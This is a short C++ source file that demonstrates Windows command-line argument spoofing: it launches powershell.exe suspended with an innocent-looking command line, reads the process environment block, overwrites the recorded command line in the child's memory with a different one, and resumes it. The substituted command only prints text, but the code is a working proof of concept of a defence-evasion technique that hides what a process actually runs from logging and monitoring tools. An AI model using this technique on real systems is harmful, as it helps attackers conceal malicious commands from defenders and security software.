// Command_Line_Argument_Spoofing.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <iostream>
#include <Windows.h>
#include <winternl.h>

int main()
{	
	const char* Legit_command_Line = "powershell.exe -NoExit -c Write-Host 'This is just a friendly argument, nothing to see here'";
    wchar_t Not_Legit_command_Line[] = L"powershell.exe -NoExit -c Write-Host This is just a friendly argument, nothing to see here;Write-Host Surprise, arguments spoofed\0";
	const wchar_t* Not_Legit_command_Line1 = L"powershell.exe -NoExit -c Write-Host This is just a friendly argument, nothing to see here;Write-Host Surprise, arguments spoofed\0";


	const char* Process_path = "E:\\tool\\SysinternalsSuite\\Autoruns.exe";
	LPSTARTUPINFOA Startup_info = new STARTUPINFOA();
	PPROCESS_INFORMATION Proc_Info = new PROCESS_INFORMATION();
	PPROCESS_BASIC_INFORMATION  Proc_Basic_Info = new PROCESS_BASIC_INFORMATION;
	DWORD dwReturnLength = 0;
	RTL_USER_PROCESS_PARAMETERS* parameters;

	PPEB PEB_Buffer = new PEB();

	CreateProcessA(NULL, (LPSTR)Legit_command_Line, NULL, NULL, TRUE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, "C:\\Windows\\System32\\", Startup_info, Proc_Info);
	NtQueryInformationProcess(Proc_Info->hProcess, ProcessBasicInformation, Proc_Basic_Info, sizeof(PROCESS_BASIC_INFORMATION), &dwReturnLength);

	ReadProcessMemory(Proc_Info->hProcess, Proc_Basic_Info->PebBaseAddress, PEB_Buffer, sizeof(PEB), &dwReturnLength);

	char* alloc = (char*)malloc(sizeof(RTL_USER_PROCESS_PARAMETERS) + 300);
	ReadProcessMemory(Proc_Info->hProcess, PEB_Buffer->ProcessParameters, alloc, sizeof(RTL_USER_PROCESS_PARAMETERS) + 300, &dwReturnLength);

	parameters = (RTL_USER_PROCESS_PARAMETERS*)alloc;
	

	WriteProcessMemory(Proc_Info->hProcess, parameters->CommandLine.Buffer, Not_Legit_command_Line1, sizeof(Not_Legit_command_Line), &dwReturnLength);

	ResumeThread(Proc_Info->hThread);



}

// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
// Debug program: F5 or Debug > Start Debugging menu

// Tips for Getting Started: 
//   1. Use the Solution Explorer window to add/manage files
//   2. Use the Team Explorer window to connect to source control
//   3. Use the Output window to see build output and other messages
//   4. Use the Error List window to view errors
//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
